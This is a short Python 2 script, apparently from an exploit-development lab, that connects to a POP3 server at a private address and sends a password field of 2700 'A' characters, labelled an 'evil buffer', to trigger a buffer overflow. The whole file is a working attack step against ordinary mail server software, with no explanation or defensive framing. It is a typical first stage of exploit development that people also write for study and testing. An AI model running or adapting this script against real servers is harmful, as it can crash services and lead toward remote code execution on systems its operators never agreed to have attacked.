#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer='A'*2700
try:
	print "Sending evil buffer"
	connection=s.connect(('192.168.1.145',110))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS '+buffer+'\r\n')
	print "Done"
        #s.send('QUIT\r\n')
	#s.close()
except:
	print "Could not connect to POP3"

